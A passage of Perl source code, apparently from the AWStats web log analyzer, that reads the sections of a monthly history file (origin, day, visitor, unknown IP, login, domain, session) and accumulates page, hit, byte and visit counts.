{\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'origin'} ) {\n\t\t\t\t\t\t\tif ( $field[0] eq 'From0' ) {\n\t\t\t\t\t\t\t\t$_from_p[0] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[0] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From1' ) {\n\t\t\t\t\t\t\t\t$_from_p[1] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[1] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From2' ) {\n\t\t\t\t\t\t\t\t$_from_p[2] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[2] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From3' ) {\n\t\t\t\t\t\t\t\t$_from_p[3] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[3] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From4' ) {\n\t\t\t\t\t\t\t\t$_from_p[4] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[4] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telsif ( $field[0] eq 'From5' ) {\n\t\t\t\t\t\t\t\t$_from_p[5] += $field[1];\n\t\t\t\t\t\t\t\t$_from_h[5] += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_ORIGIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_ORIGIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_ORIGIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_ORIGIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section ORIGIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of ORIGIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'origin'};\n\t\t\t\tif ( $SectionsToSave{'origin'} ) {\n\t\t\t\t\tSave_History( 'origin', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'origin'};\n\t\t\t\t\tif ($withpurge) { @_from_p = (); @_from_h = (); }\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DAY\n\t\t\tif ( $field[0] eq 'BEGIN_DAY' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of DAY section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'day'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$DayPages{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t$DayHits{ $field[0] } +=\n\t\t\t\t\t\t\t  int( $field[2] )\n\t\t\t\t\t\t\t  ; # DayHits always load (should be >0 and if not it's a day YYYYMM00 resulting of an old file migration)\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$DayBytes{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[4] ) {\n\t\t\t\t\t\t\t\t$DayVisits{ $field[0] } += int( $field[4] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DAY'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DAY\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif ( $field[0] ne 'END_DAY' && $field[0] ne \"${xmleb}END_DAY\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DAY not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DAY section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'day'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'day'}) {\t# Must be made after read of visitor\n#\tSave_History('day',$year,$month,$date); delete $SectionsToSave{'day'};\n#\tif ($withpurge) { %DayPages=(); %DayHits=(); %DayBytes=(); %DayVisits=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_VISITOR\n\t\t\tif ( $field[0] eq 'BEGIN_VISITOR' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of VISITOR section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\n\t\t\t\t\t\t# For backward compatibility\n\t\t\t\t\t\tif ($readvisitorforbackward) {\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$MonthUnique{ $year . $month }++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $MonthRequired ne 'all' ) {\n\t\t\t\t\t\t\t\tif (   $field[0] !~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/\n\t\t\t\t\t\t\t\t\t&& $field[0] !~ /^[0-9A-F]*:/i )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t$MonthHostsKnown{ $year . $month }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse { $MonthHostsUnknown{ $year . $month }++; }\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Process data saved in 'wait' arrays\n\t\t\t\t\t\tif ( $withupdate && $_waithost_e{ $field[0] } ) {\n\t\t\t\t\t\t\tmy $timehostl = int( $field[4] || 0 );\n\t\t\t\t\t\t\tmy $timehosts = int( $field[5] || 0 );\n\t\t\t\t\t\t\tmy $newtimehosts = (\n\t\t\t\t\t\t\t\t  $_waithost_s{ $field[0] }\n\t\t\t\t\t\t\t\t? $_waithost_s{ $field[0] }\n\t\t\t\t\t\t\t\t: $_host_s{ $field[0] }\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tmy $newtimehostl = (\n\t\t\t\t\t\t\t\t  $_waithost_l{ $field[0] }\n\t\t\t\t\t\t\t\t? $_waithost_l{ $field[0] }\n\t\t\t\t\t\t\t\t: $_host_l{ $field[0] }\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tif ( $newtimehosts > $timehostl + $VISITTIMEOUT ) {\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\" Visit for $field[0] in 'wait' arrays is a new visit different than last in history\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[6] ) { $_url_x{ $field[6] }++; }\n\t\t\t\t\t\t\t\t$_url_e{ $_waithost_e{ $field[0] } }++;\n\t\t\t\t\t\t\t\t$newtimehosts =~ /^(\\d\\d\\d\\d\\d\\d\\d\\d)/;\n\t\t\t\t\t\t\t\t$DayVisits{$1}++;\n\t\t\t\t\t\t\t\tif ( $timehosts && $timehostl ) {\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange( $timehosts,\n\t\t\t\t\t\t\t\t\t\t\t$timehostl )\n\t\t\t\t\t\t\t\t\t  }++;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $_waithost_s{ $field[0] } ) {\n\n\t   # First session found in log was followed by another one so it's finished\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange( $newtimehosts,\n\t\t\t\t\t\t\t\t\t\t\t$newtimehostl )\n\t\t\t\t\t\t\t\t\t  }++;\n\t\t\t\t\t\t\t\t}\n\n\t\t\t\t\t # Here $_host_l $_host_s and $_host_u are correctly defined\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\t\t\tdebug(\n\" Visit for $field[0] in 'wait' arrays is following of last visit in history\",\n\t\t\t\t\t\t\t\t\t\t4\n\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $_waithost_s{ $field[0] } ) {\n\n\t   # First session found in log was followed by another one so it's finished\n\t\t\t\t\t\t\t\t\t$_session{\n\t\t\t\t\t\t\t\t\t\tGetSessionRange(\n\t\t\t\t\t\t\t\t\t\t\tMinimumButNoZero(\n\t\t\t\t\t\t\t\t\t\t\t\t$timehosts, $newtimehosts\n\t\t\t\t\t\t\t\t\t\t\t),\n\t\t\t\t\t\t\t\t\t\t\t$timehostl > $newtimehostl\n\t\t\t\t\t\t\t\t\t\t\t? $timehostl\n\t\t\t\t\t\t\t\t\t\t\t: $newtimehostl\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t  }++;\n\n\t\t\t\t\t # Here $_host_l $_host_s and $_host_u are correctly defined\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telse {\n\n\t\t\t\t\t\t\t\t\t# We correct $_host_l $_host_s and $_host_u\n\t\t\t\t\t\t\t\t\tif ( $timehostl > $newtimehostl ) {\n\t\t\t\t\t\t\t\t\t\t$_host_l{ $field[0] } = $timehostl;\n\t\t\t\t\t\t\t\t\t\t$_host_u{ $field[0] } = $field[6];\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\tif ( $timehosts < $newtimehosts ) {\n\t\t\t\t\t\t\t\t\t\t$_host_s{ $field[0] } = $timehosts;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tdelete $_waithost_e{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_l{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_s{ $field[0] };\n\t\t\t\t\t\t\tdelete $_waithost_u{ $field[0] };\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Load records\n\t\t\t\t\t\tif (   $readvisitorforbackward != 2\n\t\t\t\t\t\t\t&& $SectionsToLoad{'visitor'} )\n\t\t\t\t\t\t{    # if readvisitorforbackward==2 we do not load\n\t\t\t\t\t\t\tmy $loadrecord = 0;\n\t\t\t\t\t\t\tif ($withupdate) {\n\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse {\n\t\t\t\t\t\t\t\tif (   $HTMLOutput{'allhosts'}\n\t\t\t\t\t\t\t\t\t|| $HTMLOutput{'lasthosts'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t\t\t\t!$FilterIn{'host'}\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~ /$FilterIn{'host'}/i\n\t\t\t\t\t\t\t\t\t\t)\n\t\t\t\t\t\t\t\t\t\t&& ( !$FilterEx{'host'}\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] !~\n\t\t\t\t\t\t\t\t\t\t\t/$FilterEx{'host'}/i )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\telsif ($MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t\t|| $field[2] >= $MinHit{'Host'} )\n\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\tif (\n\t\t\t\t\t\t\t\t\t\t$HTMLOutput{'unknownip'}\n\t\t\t\t\t\t\t\t\t\t&& ( $field[0] =~ /^\\d+\\.\\d+\\.\\d+\\.\\d+$/\n\t\t\t\t\t\t\t\t\t\t\t|| $field[0] =~ /^[0-9A-F]*:/i )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\telsif (\n\t\t\t\t\t\t\t\t\t\t$HTMLOutput{'main'}\n\t\t\t\t\t\t\t\t\t\t&& (   $MonthRequired eq 'all'\n\t\t\t\t\t\t\t\t\t\t\t|| $countloaded <\n\t\t\t\t\t\t\t\t\t\t\t$MaxNbOf{'HostsShown'} )\n\t\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t$loadrecord = 1;\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($loadrecord) {\n\t\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t\t$_host_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t\t$_host_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t\t$_host_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\tif ( $field[4] && !$_host_l{ $field[0] } )\n\t\t\t\t\t\t\t\t{ # We save last connexion params if not previously defined\n\t\t\t\t\t\t\t\t\t$_host_l{ $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t\t\tif ($withupdate)\n\t\t\t\t\t\t\t\t\t{ # field[5] field[6] are used only for update\n\t\t\t\t\t\t\t\t\t\tif ( $field[5]\n\t\t\t\t\t\t\t\t\t\t\t&& !$_host_s{ $field[0] } )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$_host_s{ $field[0] } =\n\t\t\t\t\t\t\t\t\t\t\t  int( $field[5] );\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t\tif ( $field[6]\n\t\t\t\t\t\t\t\t\t\t\t&& !$_host_u{ $field[0] } )\n\t\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\t\t$_host_u{ $field[0] } = $field[6];\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_VISITOR'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_VISITOR\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_VISITOR'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_VISITOR\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section VISITOR not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of VISITOR section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'visitor'};\n\n# WE DO NOT SAVE SECTION NOW TO BE SURE TO HAVE THIS LARGE SECTION NOT AT THE BEGINNING OF FILE\n#if ($SectionsToSave{'visitor'}) {\n#\tSave_History('visitor',$year,$month,$date); delete $SectionsToSave{'visitor'};\n#\tif ($withpurge) { %_host_p=(); %_host_h=(); %_host_k=(); %_host_l=(); %_host_s=(); %_host_u=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_UNKNOWNIP for backward compatibility\n\t\t\tif ( $field[0] eq 'BEGIN_UNKNOWNIP' ) {\n\t\t\t\tmy %iptomigrate = ();\n\t\t\t\tif ($Debug) { debug(\" Begin of UNKNOWNIP section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'unknownip'} ) {\n\t\t\t\t\t\t\t$iptomigrate{ $field[0] } = $field[1] || 0;\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_UNKNOWNIP'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_UNKNOWNIP\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_UNKNOWNIP'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_UNKNOWNIP\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section UNKOWNIP not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of UNKOWNIP section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'visitor'};\n\n# THIS SECTION IS NEVER SAVED. ONLY READ FOR MIGRATE AND CONVERTED INTO VISITOR SECTION\n\t\t\t\tforeach ( keys %iptomigrate ) {\n\t\t\t\t\t$_host_p{$_} += int( $_host_p{'Unknown'} / $countloaded );\n\t\t\t\t\t$_host_h{$_} += int( $_host_h{'Unknown'} / $countloaded );\n\t\t\t\t\t$_host_k{$_} += int( $_host_k{'Unknown'} / $countloaded );\n\t\t\t\t\tif ( $iptomigrate{$_} > 0 ) {\n\t\t\t\t\t\t$_host_l{$_} = $iptomigrate{$_};\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tdelete $_host_p{'Unknown'};\n\t\t\t\tdelete $_host_h{'Unknown'};\n\t\t\t\tdelete $_host_k{'Unknown'};\n\t\t\t\tdelete $_host_l{'Unknown'};\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_LOGIN\n\t\t\tif ( $field[0] eq 'BEGIN_LOGIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of LOGIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'login'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_login_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_login_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_login_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( !$_login_l{ $field[0] } && $field[4] ) {\n\t\t\t\t\t\t\t\t$_login_l{ $field[0] } = int( $field[4] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_LOGIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_LOGIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_LOGIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_LOGIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section LOGIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of LOGIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'login'};\n\t\t\t\tif ( $SectionsToSave{'login'} ) {\n\t\t\t\t\tSave_History( 'login', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'login'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_login_p = ();\n\t\t\t\t\t\t%_login_h = ();\n\t\t\t\t\t\t%_login_k = ();\n\t\t\t\t\t\t%_login_l = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_DOMAIN\n\t\t\tif ( $field[0] eq 'BEGIN_DOMAIN' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of DOMAIN section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'domain'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_domener_p{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_domener_h{ $field[0] } += $field[2];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_domener_k{ $field[0] } += $field[3];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_DOMAIN'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_DOMAIN\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_DOMAIN'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_DOMAIN\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section DOMAIN not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of DOMAIN section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'domain'};\n\t\t\t\tif ( $SectionsToSave{'domain'} ) {\n\t\t\t\t\tSave_History( 'domain', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'domain'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_domener_p = ();\n\t\t\t\t\t\t%_domener_h = ();\n\t\t\t\t\t\t%_domener_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_SESSION\n\t\t\tif ( $field[0] eq 'BEGIN_SESSION' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of SESSION section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'session'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_session{ $field[0] } += $field[1];\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_SESSION'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_SESSION\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_SESSION'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_SESSION\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section SESSION not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of SESSION section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'session'};\n\n# WE DO NOT SAVE SECTION NOW BECAUSE VALUES CAN BE CHANGED AFTER READING VISITOR\n#if ($SectionsToSave{'session'}) {\n#\tSave_History('session',$year,$month,$date); delete $SectionsToSave{'session'}; }\n#\tif ($withpurge) { %_session=(); }\n#}\n\t\t\t\tif ( !scalar %SectionsToLoad ) 